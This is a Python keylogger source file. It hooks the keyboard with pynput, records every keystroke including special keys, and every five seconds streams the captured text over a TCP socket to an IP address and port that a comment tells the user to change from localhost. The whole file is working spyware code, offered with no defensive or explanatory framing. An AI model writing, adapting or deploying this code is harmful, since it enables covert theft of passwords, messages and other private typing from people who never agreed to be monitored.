from pynput import keyboard
from threading import Timer
import socket
import sys

text = ""
TIME_INTERVAL = 5
# CHANGE PORT AND ADDRESS !!! ==========
IP = 'localhost'
PORT = 8900

# Connection via sockets...
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def send_post_request():

    # Send data in encode format...
    s.sendall(text.encode())
    timer_ = Timer(TIME_INTERVAL, send_post_request)
    timer_.start()

def on_press(key):
    global text

    print(key)

    # Special buttons
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key in [keyboard.Key.ctrl,keyboard.Key.ctrl_l,keyboard.Key.ctrl_r]:
        text += "Ctrl "
    elif key == keyboard.Key.caps_lock:
        text += "CapsLock "

    # Actions with backspace
    elif (key == keyboard.Key.backspace and len(text) == 0) or key in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_gr, keyboard.Key.alt_r]:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    
    # Exit button (You can always change it to ESC) ======= !!! DISCONNECTION !!! - CHANGE IT! ==============
    elif key == keyboard.Key.esc:
        # close socket connection
        s.close()
        raise Exception('Exit...')

    # Numpad settings
    elif key == keyboard.Key.num_lock:
        text += 'NumLock '
    elif '<' in str(key) and '>' in str(key):
        text += chr(int(str(key).strip("<").strip(">"))-48)

    # Arrows
    elif key == keyboard.Key.up:
        text += '/\\'
    elif key == keyboard.Key.down:
        text += '\\/'
    elif key == keyboard.Key.left:
        text += '<'
    elif key == keyboard.Key.right:
        text += '>'

    # Letters
    else:
        text += str(key).strip("'")
    
with keyboard.Listener(on_press=on_press) as listener:
    send_post_request()
    listener.join()
